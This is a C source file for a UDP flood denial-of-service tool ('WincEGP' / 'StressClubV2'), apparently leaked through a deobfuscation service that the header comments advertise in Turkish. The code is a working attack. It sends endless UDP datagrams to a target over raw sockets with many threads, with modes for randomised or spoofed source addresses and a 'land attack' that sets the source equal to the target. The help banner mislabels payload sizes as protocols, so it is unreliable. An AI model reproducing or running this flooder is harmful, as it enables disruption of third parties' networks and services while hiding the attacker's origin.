// Bu script "WincEGP" scriptidir.
// PistolaConfuse sistemi sayesinde kaynak kodu kırılmıştır.
// Sizde "https://pistola.dev" web sitemizden Premium alıp istediğiniz scriptin kaynak kodunu alabilirsiniz.
// Discord Adresimiz ; discord.gg/obfuscate

#include "winc.h"
#define ipsdef "null"

struct arg_struct
{
    struct sockaddr_in caddr;
    int caddr_size;
    MODES startup;
};


/*
** Parse command line args.
*/
int
main( int argc, char **argv )
{
    MODES		startup;
    struct sockaddr_in	caddr;
    struct hostent	*dns = NULL;
    static int		c, salarm, dport;
    int threads_i = 1;

    prepare_modes(&startup);

    while( (c = getopt(argc, argv, "1p:z:t:rs:mi:")) > -1 )
        switch(c)
        {
            case '1': startup.one = TRUE;
                      break;
            case 'p': dport = atoi(optarg);
                      startup.rdport = FALSE;
                      break;
            case 'z': if( (startup.size = atoi(optarg) ) > 1000 )
                      {
                          printf("\033[0;32mUDP Methodunda Maximum Paket Boyutu 1000 Lenght.\033[1;m\n");
                          return 1;
                      }

                      break;
            case 't': salarm = atoi(optarg);
                      break;
            case 'r': startup.rsource = TRUE;
                      startup.ssource = FALSE;
                      startup.land = FALSE;
                      printf("\033[1;34mHırsızdan hiç bir şey olmaz Ege'cim ;)\033[1;m\n");
                      break;
            case 's': strncpy(startup.source, optarg, sizeof(startup.source));
                      startup.ssource = TRUE;
                      startup.rsource = FALSE;
                      startup.land = FALSE;
                      break;
            case 'l': startup.land = TRUE;
                      startup.ssource = FALSE;
                      startup.rsource = FALSE;
                      break;
            case 'i': startup.threads += atoi(optarg);
                      threads_i += atoi(optarg);
                      break;
            case '?': default: exit(1);
        }

    if( argc - optind < 1 || argc - optind > 1 )
        banner(argv[0]);
    else if( (dns = gethostbyname(argv[optind])) == NULL )
    {
	herror(argv[optind]);
	return 1;
    }

    /* Set threads */
    pthread_t threads[threads_i]; 

    /* Set alarm */
    if( salarm != 0 )
	alarm(salarm);

    /* seed new sequence of pseudo-random integers to be returned by rand() */
    srand(time(NULL));

    /* Fill caddr struct. */
    caddr.sin_family = dns->h_addrtype;
    memcpy(&caddr.sin_addr, *dns->h_addr_list, dns->h_length );
    caddr.sin_port = htons(dport);


    /* Start sending datagrams. */
    if( startup.rsource || startup.ssource || startup.land )
    {
        struct arg_struct args;
        args.caddr = caddr;
        args.caddr_size = sizeof(caddr);
        args.startup = startup;


        do
        {
            pthread_create(&threads[threads_i - 1],NULL, sendto_root, (void *)&args);
            threads_i--;
        }
        while (threads_i > 0);
    }
    else
    {
	sendto_nonroot(&caddr, sizeof(caddr), &startup);
    }

    pthread_join(threads[0], NULL);


    return 0;
}


/*
** Send datagrams without source spoof.
*/
void
sendto_nonroot( struct sockaddr_in *caddr, socklen_t caddr_len, MODES *modes )
{
    char	packet[100];
    int		sock, i;


    if( (sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1 )
    {
        perror("socket()");
	return;
    }

    /* Prepare datagram data. */
    for( i = 0; i <= modes->size ; i++ )
	 packet[i] = 'z';

    do
    {
        if( modes->rdport )
	    caddr->sin_port = htons(rand()%65535);

        sendto(sock, packet, modes->size, 0, (struct sockaddr *)caddr, caddr_len );
    }
    while( !modes->one );
}



/*
** Send datagrams with source spoof.
*/
void *
sendto_root(void* arguments)
{
    struct arg_struct* args = (struct arg_struct*)arguments;
    struct sockaddr_in *caddr = &(args->caddr);
    socklen_t caddr_len = args->caddr_size;
    MODES *modes = &(args->startup);
    struct udphdr	udphdr;
    struct ip		iphdr;
    char		packet[128], *p;
    int			i, sock, dgsize;


    if( (sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW )) == -1 )
    {
        perror("socket()");
        return 0;
    }

    /* Write IP header. */
    iphdr.ip_hl = 5;
    iphdr.ip_v = 4;
    iphdr.ip_tos = 0x0;
    iphdr.ip_id = htons(1);
    iphdr.ip_off = 0;
    iphdr.ip_ttl = 64;
    iphdr.ip_p = IPPROTO_UDP;
    memcpy((char *)&iphdr.ip_dst.s_addr, &caddr->sin_addr.s_addr, sizeof(caddr->sin_addr.s_addr));
    iphdr.ip_sum = in_cksum((u_short *)&iphdr, sizeof(iphdr));
    iphdr.ip_len = htons(sizeof(iphdr) + sizeof(udphdr) + modes->size);
    if( modes->ssource )
        iphdr.ip_src.s_addr = inet_addr(modes->source);

    /* Write UDP header. */
    udphdr.uh_sum = 0;
    udphdr.uh_ulen = htons(sizeof(udphdr) + modes->size);
    udphdr.uh_dport = caddr->sin_port;
    udphdr.uh_sport = htons(rand()%65535);

    /* Land attack need same sport and source host as targets. */
    if( modes->land )
    {
        memcpy((char *)&iphdr.ip_src.s_addr, &caddr->sin_addr.s_addr, sizeof(caddr->sin_addr.s_addr));
	udphdr.uh_sport = udphdr.uh_dport;
    }

    /* Write datagram */
    memcpy(packet, &iphdr, sizeof(iphdr));
    p = &packet[sizeof(iphdr)];
    memcpy(p, &udphdr, sizeof(udphdr));
    p = &packet[sizeof(iphdr) + sizeof(udphdr)];
    for( i = 0; i <= modes->size ; i++ )
	*p++ = 'z';

    /* Datagram size */
    dgsize = sizeof(udphdr) + sizeof(iphdr) + modes->size;

    do
    {
	if( modes->rsource )
	{
	    iphdr.ip_src.s_addr = rand();
	    memcpy(packet, &iphdr, sizeof(iphdr));
        }

	if( modes->rdport || modes->rsource )
	{
	    if( modes->rdport )
	        udphdr.uh_dport = htons(rand()%65535);

            if( modes->land )
	        udphdr.uh_sport = udphdr.uh_dport;
            else
                udphdr.uh_sport = htons(rand()%65535);

            memcpy(&packet[sizeof(iphdr)], &udphdr, sizeof(udphdr));
        }

	sendto(sock, packet, dgsize, 0, (struct sockaddr *)caddr, caddr_len);
    }
    while( !modes->one );
}



/*
** Count packet checksum.
*/
u_short
in_cksum( u_int16_t *addr, int len )
{
    int		nleft = len;
    u_int16_t	*w = addr;
    u_int32_t	sum = 0;
    u_int16_t	answer = 0;


    /*
    * Our algorithm is simple, using a 32 bit accumulator (sum), we add
    * sequential 16 bit words to it, and at the end, fold back all the
    * carry bits from the top 16 bits into the lower 16 bits.
    */
    while( nleft > 1 )
    {
	sum += *w++;
	nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if( nleft == 1 )
    {
        answer=0;
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
    sum += (sum >> 16);                     /* add carry */
    answer = ~sum;                          /* truncate to 16 bits */
    return answer;
}



/*
** Preapres MODES struct, e.g. clear all values, and set some default.
*/
void
prepare_modes( MODES *junk )
{
    memset(junk, 0, sizeof(MODES));

    /* Set some default values */
    junk->size = 10;
    junk->rdport = TRUE;
    junk->threads = 1;
}



/*
** Print help.
*/
void
banner( char *name )
{
    printf("Deobfuscated by PISTOLA!\n");
    printf("https://pistola.dev\n");
    printf("Hırsızdan hiç bir şey olmaz Ege'cim ;)\n");
    printf("\n");
    printf("Script Coded By Ahmet[Ege] And WincGP\n");
    printf("[+]./StressClubV2 -r IP -p Port -z Protocol Options\n");
    printf("[+]Protocol Settings : {-z 0-4 IGRP Protocol}\n");
    printf("[+]Protocol Settings : {-z 5-10 IGRP V1,V2,V3,V4,V5 Protocol}\n");
    printf("[+]Protocol Settings : {-z 20-30 Random Hex}\n");
    printf("[+]Protocol Settings : {-z 50-100 Random Protocol}\n");
    printf("[+]Protocol Settings : {-z 100-1000 Crazy Protocol}\n");
    exit(1);
}
